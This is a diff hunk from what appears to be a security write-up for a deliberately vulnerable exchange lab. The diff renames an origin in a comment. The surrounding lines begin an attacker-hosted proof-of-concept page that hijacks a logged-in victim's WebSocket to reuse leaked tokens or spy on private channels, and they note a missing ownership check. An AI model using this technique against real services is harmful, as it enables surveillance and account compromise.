@@ -69,7 +69,7 @@ update applies every supplied field. No ownership check.
 <!-- Hosted at attacker.example. Victim visits while logged in. -->
 <script>
   // Token leakage variant: if the page can read the JWT (e.g.,
-  // via XSS or postMessage from the BVBE origin), it's used here.
+  // via XSS or postMessage from the Bitvulnex origin), it's used here.
   // Channel hijack variant: no token at all -- just subscribe to
   // a private channel of any user we want to surveil.
   const ws = new WebSocket("ws://exchange.local/ws");
